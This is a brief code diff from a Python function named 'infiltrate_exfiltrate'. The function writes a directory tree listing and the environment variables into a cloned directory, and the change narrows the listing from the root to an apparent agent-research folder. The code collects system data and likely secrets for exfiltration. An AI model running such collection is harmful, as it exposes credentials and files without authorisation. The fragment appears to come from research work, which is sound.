@@ -53,7 +53,7 @@ def infiltrate_exfiltrate():
 
         output_file = clone_dir+"/directory_tree.txt"
         with open(output_file, 'w') as f:
-            for line in list_directory_tree('/'):
+            for line in list_directory_tree('/home/prodrigues/agents_research/myagent/'):
                 f.write(f"{line}\n")
 
         env_output_file = clone_dir+"/environment_variables.txt"
